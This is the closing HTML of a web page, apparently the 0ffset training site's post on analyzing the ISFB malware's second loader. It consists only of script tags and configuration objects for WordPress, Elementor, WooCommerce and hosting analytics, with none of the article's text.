<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/scripts.js?ver=20180910" id="engitech-scripts-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/header-mobile.js?ver=20180910" id="engitech-header-mobile-scripts-js"></script>
<script type="text/javascript" id="eael-general-js-extra">
/* <![CDATA[ */
var localize = {"ajaxurl":"https:\/\/www.0ffset.net\/wp-admin\/admin-ajax.php","nonce":"69af3b5912","i18n":{"added":"Added ","compare":"Compare","loading":"Loading..."},"eael_translate_text":{"required_text":"is a required field","invalid_text":"Invalid","billing_text":"Billing","shipping_text":"Shipping","fg_mfp_counter_text":"of"},"page_permalink":"https:\/\/www.0ffset.net\/reverse-engineering\/analyzing-isfb-second-loader\/","cart_redirectition":"no","cart_page_url":"https:\/\/www.0ffset.net\/cart\/","el_breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/essential-addons-for-elementor-lite/assets/front-end/js/view/general.min.js?ver=5.9.3" id="eael-general-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.18.2" id="elementor-pro-webpack-runtime-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.18.3" id="elementor-webpack-runtime-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.18.3" id="elementor-frontend-modules-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" id="elementor-pro-frontend-js-before">
/* <![CDATA[ */
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/www.0ffset.net\/wp-admin\/admin-ajax.php","nonce":"97a94573c1","urls":{"assets":"https:\/\/www.0ffset.net\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/www.0ffset.net\/wp-json\/"},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"woocommerce":{"menu_cart":{"cart_page_url":"https:\/\/www.0ffset.net\/cart\/","checkout_page_url":"https:\/\/www.0ffset.net\/checkout\/","fragments_nonce":"a56fd03f4a"}},"facebook_sdk":{"lang":"en_GB","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/www.0ffset.net\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.18.2" id="elementor-pro-frontend-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2" id="elementor-waypoints-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2" id="jquery-ui-core-js"></script>
<script type="text/javascript" id="elementor-frontend-js-before">
/* <![CDATA[ */
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.18.3","is_static":false,"experimentalFeatures":{"e_dom_optimization":true,"e_optimized_assets_loading":true,"additional_custom_breakpoints":true,"theme_builder_v2":true,"block_editor_assets_optimize":true,"landing-pages":true,"e_image_loading_optimization":true,"e_global_styleguide":true,"page-transitions":true,"notes":true,"form-submissions":true,"e_scroll_snap":true},"urls":{"assets":"https:\/\/www.0ffset.net\/wp-content\/plugins\/elementor\/assets\/"},"swiperClass":"swiper-container","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","woocommerce_notices_elements":[]},"post":{"id":2117,"title":"Analyzing%20ISFB%20%E2%80%93%20The%20Second%20Loader%20%7C%200ffset%20Training%20Solutions","excerpt":"","featuredImage":"https:\/\/www.0ffset.net\/wp-content\/uploads\/2021\/06\/Screenshot_6-1.png"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.18.3" id="elementor-frontend-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.18.2" id="pro-elements-handlers-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/zoom/jquery.zoom.min.js?ver=1.7.21-wc.8.4.0" id="zoom-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/flexslider/jquery.flexslider.min.js?ver=2.7.2-wc.8.4.0" id="flexslider-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/photoswipe/photoswipe.min.js?ver=4.1.1-wc.8.4.0" id="photoswipe-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/photoswipe/photoswipe-ui-default.min.js?ver=4.1.1-wc.8.4.0" id="photoswipe-ui-default-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/underscore.min.js?ver=1.13.4" id="underscore-js"></script>
<script type="text/javascript" id="wp-util-js-extra">
/* <![CDATA[ */
var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/wp-util.min.js?ver=6.4.2" id="wp-util-js"></script>
<script type="text/javascript" id="wc-add-to-cart-variation-js-extra">
/* <![CDATA[ */
var wc_add_to_cart_variation_params = {"wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_no_matching_variations_text":"Sorry, no products matched your selection. Please choose a different combination.","i18n_make_a_selection_text":"Please select some product options before adding this product to your basket.","i18n_unavailable_text":"Sorry, this product is unavailable. Please choose a different combination."};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart-variation.min.js?ver=8.4.0" id="wc-add-to-cart-variation-js" defer="defer" data-wp-strategy="defer"></script>
<script type="text/javascript" id="wc-single-product-js-extra">
/* <![CDATA[ */
var wc_single_product_params = {"i18n_required_rating_text":"Please select a rating","review_rating_required":"yes","flexslider":{"rtl":false,"animation":"slide","smoothHeight":true,"directionNav":false,"controlNav":"thumbnails","slideshow":false,"animationSpeed":500,"animationLoop":false,"allowOneSlide":false},"zoom_enabled":"1","zoom_options":[],"photoswipe_enabled":"1","photoswipe_options":{"shareEl":false,"closeOnScroll":false,"history":false,"hideAnimationDuration":0,"showAnimationDuration":0},"flexslider_enabled":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/woocommerce/assets/js/frontend/single-product.min.js?ver=8.4.0" id="wc-single-product-js" defer="defer" data-wp-strategy="defer"></script>
		<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'wpaas'},{'server':'4b522bc6-b590-e72d-e2cb-58a1b520225d.secureserver.net'},{'pod':'n3nlwppod03'},{'storage':'n3cephmah003pod03_data12'},{'xid':'42941395'},{'wp':'6.4.2'},{'php':'8.0.30'},{'loggedin':'0'},{'cdn':'0'},{'builder':'wp-block-editor'},{'theme':'engitech'},{'wds':'0'},{'wp_alloptions_count':'715'},{'wp_alloptions_bytes':'286772'})</script>
		<script>window.addEventListener('click', function (elem) { var _elem$target, _elem$target$dataset, _window, _window$_trfq; return (elem === null || elem === void 0 ? void 0 : (_elem$target = elem.target) === null || _elem$target === void 0 ? void 0 : (_elem$target$dataset = _elem$target.dataset) === null || _elem$target$dataset === void 0 ? void 0 : _elem$target$dataset.eid) && ((_window = window) === null || _window === void 0 ? void 0 : (_window$_trfq = _window._trfq) === null || _window$_trfq === void 0 ? void 0 : _window$_trfq.push(["cmdLogEvent", "click", elem.target.dataset.eid]));});</script>
		<script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script>
		<script src='https://img1.wsimg.com/traffic-assets/js/tccl-tti.min.js' onload="window.tti.calculateTTI()"></script>
		
</body>
</html>
